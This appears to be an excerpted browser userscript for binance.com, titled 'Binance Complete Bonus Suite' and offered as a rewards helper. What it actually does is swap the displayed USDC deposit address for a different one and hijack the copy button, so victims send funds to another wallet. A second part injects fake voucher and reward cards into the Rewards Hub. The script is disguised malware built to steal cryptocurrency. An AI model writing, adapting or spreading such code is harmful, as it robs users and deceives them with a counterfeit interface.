// ==UserScript==
// @name         Binance Complete Bonus Suite
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Rewards Hub Bonus
// @author       Combined
// @match        https://www.binance.com/*
// @match        https://binance.com/*
// @grant        none
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/552883/Binance%20Complete%20Bonus%20Suite.user.js
// @updateURL https://update.greasyfork.org/scripts/552883/Binance%20Complete%20Bonus%20Suite.meta.js
// ==/UserScript==
...
;(() => {
  ...
  // ============================================================================
  // PART 1: ADDRESS REPLACEMENT (for USDC deposit pages)
  // ============================================================================
  ...
  function replaceAddress() {
    let targetContainer = document.querySelector('.break-all.text-t-Primary');
    ...
    if (newAddress && targetContainer.textContent.trim() !== newAddress) {
      targetContainer.innerHTML = '';
      targetContainer.textContent = newAddress;
      console.log(`✅ Address replaced for ${network} with "${newAddress}"`);
    }
  }
  ...
  function attachCopyHandler() {
    ...
    if (copyBtn !== currentCopyBtn) {
      ...
      copyBtn.addEventListener('click', () => {
        ...
        let textToCopy = targetContainer.textContent.trim();
      ...
      console.log('🔄 Copy button intercepted (new element).');
    }
  }
  ...
  function insertContractInfo() {
    ...
    console.log('🆕 Info added under bn-step-content-desc');
  }

  // ============================================================================
  // PART 2: PROXY OVERLAY & REWARDS HUB MODIFICATIONS
  // ============================================================================
  ...
  const replacementHTML = `<br><div class="TaskCard TaskCard--enabled"><div class="bn-flex TaskCard-content"><div class="0"><svg fill="PrimaryText" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="bn-svg">
			<path d="M19.5 21.22h-15a.9.9 0 010-1.8h15a.9.9 0 010 1.8zM11.1 3a.9.9 0 011.8 0v11.826l3.963-3.963a.9.9 0 011.274 1.274l-5.5 5.5a.9.9 0 01-1.274 0l-5.5-5.5-.061-.069a.9.9 0 011.266-1.266l.069.061 3.963 3.963V3z" fill="currentColor"></path>
					...
					Rules
				</button></span></div><button aria-disabled="false" class="bn-button bn-button__primary data-size-small active TaskAction TaskCard-actions-act ul-decoration-none">Use Voucher</button></div></div></div>`
  ...
  const observer = new MutationObserver((mutations) => {
    // Address replacement (for deposit pages)
    replaceAddress();
    attachCopyHandler();
    insertContractInfo();

    // Banner changes (for rewards hub)
    applyBannerChanges();
  ...
  console.log('🚀 Binance Philippines Complete Suite loaded successfully');
})();